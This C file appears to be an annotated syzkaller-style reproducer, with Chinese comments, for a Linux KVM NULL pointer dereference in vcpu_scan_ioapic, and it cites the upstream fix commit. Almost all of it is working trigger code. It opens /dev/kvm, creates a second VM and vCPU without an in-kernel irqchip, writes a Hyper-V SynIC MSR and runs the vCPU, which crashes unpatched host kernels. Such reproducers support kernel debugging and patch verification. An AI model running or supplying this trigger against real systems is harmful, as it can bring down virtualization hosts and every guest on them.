#define _GNU_SOURCE

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/*
 * KVM: X86: Fix NULL deref in vcpu_scan_ioapic
 * https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=dcbd3e49c2f0b2c2d8a321507ff8f3de4af76d7c
 */

uint64_t r[7] = {0xffffffffffffffff, 0xffffffffffffffff,
		 0xffffffffffffffff, 0xffffffffffffffff,
		 0xffffffffffffffff, 0xffffffffffffffff,
		 0xffffffffffffffff};

/*
 * 第二次创建vcpu的时候没有调用KVM_CREATE_IRQCHIP!!!
 */

int main(void)
{
	/* 用mmap分配一段内存在0x20000000ul, 长度0x1000000ul */
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 3ul, 0x32ul, -1, 0);
	
	intptr_t res = 0;
	/*
	 * #define AT_FDCWD -100
	 * Special value used to indicate openat should use the current
	 * working directory.
	 */
	res = syscall(__NR_openat, 0xffffffffffffff9cul, 0ul, 0ul, 0ul);
	if (res != -1)
		r[0] = res;
	
	syscall(__NR_sendmsg, r[0], 0ul, 0ul);
	syscall(__NR_ioctl, -1, 0xae47ul, 0ul);

	memcpy((void*)0x20000200, "/dev/kvm\000", 9);
	/*
	 * 此时0x20000200ul的内容是/dev/kvm, open这个文件
	 */
	res = syscall(__NR_openat, 0xffffffffffffff9cul, 0x20000200ul, 0ul, 0ul);
	if (res != -1)
		r[1] = res;
	
	/*
	 * #define KVM_CREATE_VM _IO(KVMIO,   0x01) // returns a VM fd
	 */
	res = syscall(__NR_ioctl, r[1], 0xae01ul, 0ul);
	if (res != -1)
		r[2] = res;

	/*
	 * #define KVM_CREATE_IRQCHIP _IO(KVMIO,   0x60)
	 */
	syscall(__NR_ioctl, r[2], 0xae60ul, 0);
	/*
	 * #define KVM_CREATE_VCPU _IO(KVMIO,   0x41)
	 * KVM_CREATE_VCPU receives as a parameter the vcpu slot, and returns a vcpu fd.
	 */
	res = syscall(__NR_ioctl, r[2], 0xae41ul, 0ul);
	if (res != -1)
		r[3] = res;
	
	*(uint64_t*)0x20000180 = 0;
	*(uint32_t*)0x20000188 = 0;
	*(uint16_t*)0x2000018c = 0;
	*(uint8_t*)0x2000018e = 0;
	*(uint8_t*)0x2000018f = 0;
	*(uint8_t*)0x20000190 = 0;
	*(uint8_t*)0x20000191 = 0;
	*(uint8_t*)0x20000192 = 0;
	*(uint8_t*)0x20000193 = 0;
	*(uint8_t*)0x20000194 = 0;
	*(uint8_t*)0x20000195 = 0;
	*(uint8_t*)0x20000196 = 0;
	*(uint8_t*)0x20000197 = 0;
	*(uint64_t*)0x20000198 = 0;
	*(uint32_t*)0x200001a0 = 0;
	*(uint16_t*)0x200001a4 = 0;
	*(uint8_t*)0x200001a6 = 0;
	*(uint8_t*)0x200001a7 = 0;
	*(uint8_t*)0x200001a8 = 0;
	*(uint8_t*)0x200001a9 = 0;
	*(uint8_t*)0x200001aa = 0;
	*(uint8_t*)0x200001ab = 0;
	*(uint8_t*)0x200001ac = 0;
	*(uint8_t*)0x200001ad = 9;
	*(uint8_t*)0x200001ae = 0;
	*(uint8_t*)0x200001af = 0;
	*(uint64_t*)0x200001b0 = 0x100000;
	*(uint32_t*)0x200001b8 = 0;
	*(uint16_t*)0x200001bc = 0;
	*(uint8_t*)0x200001be = 0;
	*(uint8_t*)0x200001bf = 0;
	*(uint8_t*)0x200001c0 = 0;
	*(uint8_t*)0x200001c1 = 1;
	*(uint8_t*)0x200001c2 = 0;
	*(uint8_t*)0x200001c3 = 0;
	*(uint8_t*)0x200001c4 = 0;
	*(uint8_t*)0x200001c5 = 0;
	*(uint8_t*)0x200001c6 = 0;
	*(uint8_t*)0x200001c7 = 0;
	*(uint64_t*)0x200001c8 = 0;
	*(uint32_t*)0x200001d0 = 0;
	*(uint16_t*)0x200001d4 = 0;
	*(uint8_t*)0x200001d6 = 0;
	*(uint8_t*)0x200001d7 = 0;
	*(uint8_t*)0x200001d8 = 0;
	*(uint8_t*)0x200001d9 = 0;
	*(uint8_t*)0x200001da = 0;
	*(uint8_t*)0x200001db = 0;
	*(uint8_t*)0x200001dc = 0;
	*(uint8_t*)0x200001dd = 0;
	*(uint8_t*)0x200001de = 0;
	*(uint8_t*)0x200001df = 0;
	*(uint64_t*)0x200001e0 = 0;
	*(uint32_t*)0x200001e8 = 0;
	*(uint16_t*)0x200001ec = 0;
	*(uint8_t*)0x200001ee = 0;
	*(uint8_t*)0x200001ef = 0;
	*(uint8_t*)0x200001f0 = 0;
	*(uint8_t*)0x200001f1 = 0;
	*(uint8_t*)0x200001f2 = 0;
	*(uint8_t*)0x200001f3 = 0;
	*(uint8_t*)0x200001f4 = 0;
	*(uint8_t*)0x200001f5 = 0;
	*(uint8_t*)0x200001f6 = 0;
	*(uint8_t*)0x200001f7 = 0;
	*(uint64_t*)0x200001f8 = 0;
	*(uint32_t*)0x20000200 = 0;
	*(uint16_t*)0x20000204 = 0;
	*(uint8_t*)0x20000206 = 0;
	*(uint8_t*)0x20000207 = 0;
	*(uint8_t*)0x20000208 = 0;
	*(uint8_t*)0x20000209 = 0;
	*(uint8_t*)0x2000020a = 0;
	*(uint8_t*)0x2000020b = 0;
	*(uint8_t*)0x2000020c = 0;
	*(uint8_t*)0x2000020d = 0;
	*(uint8_t*)0x2000020e = 0;
	*(uint8_t*)0x2000020f = 0;
	*(uint64_t*)0x20000210 = 0;
	*(uint32_t*)0x20000218 = 0;
	*(uint16_t*)0x2000021c = 0;
	*(uint8_t*)0x2000021e = 0;
	*(uint8_t*)0x2000021f = 0;
	*(uint8_t*)0x20000220 = 0;
	*(uint8_t*)0x20000221 = 0;
	*(uint8_t*)0x20000222 = 0;
	*(uint8_t*)0x20000223 = 0;
	*(uint8_t*)0x20000224 = 0;
	*(uint8_t*)0x20000225 = 0;
	*(uint8_t*)0x20000226 = 0;
	*(uint8_t*)0x20000227 = 0;
	*(uint64_t*)0x20000228 = 0;
	*(uint32_t*)0x20000230 = 0;
	*(uint16_t*)0x20000234 = 9;
	*(uint8_t*)0x20000236 = 0;
	*(uint8_t*)0x20000237 = 0;
	*(uint8_t*)0x20000238 = 0;
	*(uint8_t*)0x20000239 = 0;
	*(uint8_t*)0x2000023a = 0;
	*(uint8_t*)0x2000023b = 0;
	*(uint8_t*)0x2000023c = 0;
	*(uint8_t*)0x2000023d = 0;
	*(uint8_t*)0x2000023e = 0;
	*(uint8_t*)0x2000023f = 0;
	*(uint64_t*)0x20000240 = 0;
	*(uint16_t*)0x20000248 = 0;
	*(uint16_t*)0x2000024a = 0;
	*(uint16_t*)0x2000024c = 0;
	*(uint16_t*)0x2000024e = 0;
	*(uint64_t*)0x20000250 = 0;
	*(uint16_t*)0x20000258 = 0;
	*(uint16_t*)0x2000025a = 0;
	*(uint16_t*)0x2000025c = 0;
	*(uint16_t*)0x2000025e = 0;
	*(uint64_t*)0x20000260 = 0;
	*(uint64_t*)0x20000268 = 0;
	*(uint64_t*)0x20000270 = 0x10000;
	*(uint64_t*)0x20000278 = 0;
	*(uint64_t*)0x20000280 = 0;
	*(uint64_t*)0x20000288 = 0;
	*(uint64_t*)0x20000290 = 0;
	*(uint64_t*)0x20000298 = 0;
	*(uint64_t*)0x200002a0 = 8;
	*(uint64_t*)0x200002a8 = 0;
	*(uint64_t*)0x200002b0 = 0;

	/*
	 * #define KVM_SET_SREGS _IOW(KVMIO,  0x84, struct kvm_sregs)
	 */
	syscall(__NR_ioctl, r[3], 0x4138ae84ul, 0x20000180ul);

	syscall(__NR_ioctl, -1, 0x2288ul, 0x200000c0ul);

	memcpy((void*)0x20000200, "/dev/kvm\000", 9);
	/*
	 *  此时0x20000200ul的内容是/dev/kvm, open这个文件
	 */
	res = syscall(__NR_openat, 0xffffffffffffff9cul, 0x20000200ul, 0ul, 0ul);
	if (res != -1)
		r[4] = res;

	/*
	 * define KVM_CREATE_VM _IO(KVMIO,   0x01) // returns a VM fd
	 */
	res = syscall(__NR_ioctl, r[4], 0xae01ul, 0ul);
	if (res != -1)
		r[5] = res;

	/*
	 * #define KVM_CREATE_VCPU _IO(KVMIO,   0x41)
	 * KVM_CREATE_VCPU receives as a parameter the vcpu slot, and returns a vcpu fd.
	 */
	res = syscall(__NR_ioctl, r[5], 0xae41ul, 0ul);
	if (res != -1)
		r[6] = res;
	
	*(uint32_t*)0x20000080 = 0x5c;
	*(uint32_t*)0x20000084 = 0;
	*(uint32_t*)0x20000088 = 0x4000009b;
	*(uint32_t*)0x2000008c = 0;
	*(uint64_t*)0x20000090 = 0;

	/*
	 * // for KVM_ENABLE_CAP
	 * struct kvm_enable_cap {
	 *	unsigned int cap;
	 *	unsigned int flags;
	 *	unsigned long  args[4];
	 *	unsigned char  pad[64];
	 * };
	 *
	 * 为了帮助在一些old kernel重现
	 * struct kvm_enable_cap cap;
	 * cap.cap = 123; // KVM_CAP_HYPERV_SYNIC
	 * syscall(__NR_ioctl, r[6], 0x4068aea3ul, &cap);
	 */

	/*
	 * #define KVM_SET_MSRS _IOW(KVMIO,  0x89, struct kvm_msrs)
	 */
	syscall(__NR_ioctl, r[6], 0x4008ae89ul, 0x20000080ul);
	/*
	 * #define KVM_RUN _IO(KVMIO,   0x80)
	 */
	syscall(__NR_ioctl, r[6], 0xae80ul, 0ul);
	
	return 0;
}
